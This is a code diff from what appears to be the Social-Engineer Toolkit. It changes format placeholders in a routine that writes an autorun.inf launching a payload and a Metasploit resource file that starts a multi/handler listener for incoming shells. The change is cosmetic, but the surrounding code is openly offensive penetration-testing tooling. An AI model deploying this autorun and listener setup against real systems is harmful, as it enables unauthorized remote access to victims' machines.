@@ -59,7 +59,7 @@ with open(os.path.join(autorun_path, "autorun.inf"), 'w') as filewrite:
     else:
         payload = ""
 
-    filewrite.write("""[autorun]\nopen={}\nicon=autorun.ico""".format(payload))
+    filewrite.write("""[autorun]\nopen={0}\nicon=autorun.ico""".format(payload))
 
 core.print_status("Your attack has been created in the SET home directory (/root/.set/) folder 'autorun'")
 core.print_status("Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.")
@@ -77,15 +77,15 @@ if trigger in [1, 2, 3]:
                 for line in fileopen:
                     line = line.split(" ")
                     filewrite.write("use multi/handler\n")
-                    filewrite.write("set payload {}\n".format(line[0]))
-                    filewrite.write("set lhost {}\n".format(line[1]))
-                    filewrite.write("set lport {}\n".format(line[2]))
+                    filewrite.write("set payload {0}\n".format(line[0]))
+                    filewrite.write("set lhost {0}\n".format(line[1]))
+                    filewrite.write("set lport {0}\n".format(line[2]))
                     filewrite.write("set ExitOnSession false\n")
                     filewrite.write("exploit -j\r\n\r\n")
 
         # create the listener
         core.print_status("Launching Metasploit.. This could take a few. Be patient! Or else no shells for you..")
-        subprocess.Popen("{} -r {}".format(os.path.join(msf_path, "msfconsole"),
+        subprocess.Popen("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
                                            os.path.join(core.setdir, "meta_config")),
                          shell=True).wait()
     else:
